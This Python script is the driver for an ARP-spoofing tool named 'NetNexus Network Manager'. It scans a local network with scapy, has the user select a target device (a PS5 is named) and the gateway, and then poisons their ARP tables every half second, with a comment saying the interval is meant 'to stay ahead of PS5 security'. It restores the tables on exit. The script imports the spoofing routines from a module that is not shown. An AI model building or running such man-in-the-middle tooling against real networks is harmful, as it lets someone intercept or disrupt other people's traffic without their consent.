import scapy.all as scapy
import os
import time
from core import scanner, spoof

def main():
    # --- CONFIGURATION ---
    # Replace 'enp3s0' with your interface from 'ip a' (e.g., wlan0 or eth0)
    scapy.conf.iface = "enp3s0" 
    
    # Ensure tool is run with root on Arch Linux
    if os.geteuid() != 0:
        print("[-] This tool must be run with sudo.")
        return

    print("--- NetNexus Network Manager ---")
    target_range = input("Enter network range (e.g., 192.168.1.1/24): ")
    
    print("[*] Scanning network... please ensure PS5 is ON.")
    devices = scanner.scan(target_range)
    
    print("\nID\tIP Address\t\tMAC Address\t\tDevice Name")
    print("-" * 75)
    for index, device in enumerate(devices):
        print(f"{index}\t{device['ip']}\t\t{device['mac']}\t{device['name']}")

    target_id = int(input("\nSelect Target ID to spoof: "))
    gateway_ip = input("Enter Gateway/Router IP: ")
    
    target = devices[target_id]
    
    # Get initial info for the spoofing loop
    target_mac = target['mac']
    gateway_mac, _ = spoof.get_device_info(gateway_ip)

    try:
        print(f"[*] Spoofing {target['name']}... Press Ctrl+C to stop.")
        while True:
            # Aggressive 0.5s interval to stay ahead of PS5 security
            spoof.spoof(target['ip'], gateway_ip, target_mac, gateway_mac)
            time.sleep(0.5) 
    except KeyboardInterrupt:
        print("\n[*] Restoring network state...")
        spoof.restore(target['ip'], gateway_ip)
        spoof.restore(gateway_ip, target['ip'])
        print("[+] Done.")

if __name__ == "__main__":
    main()
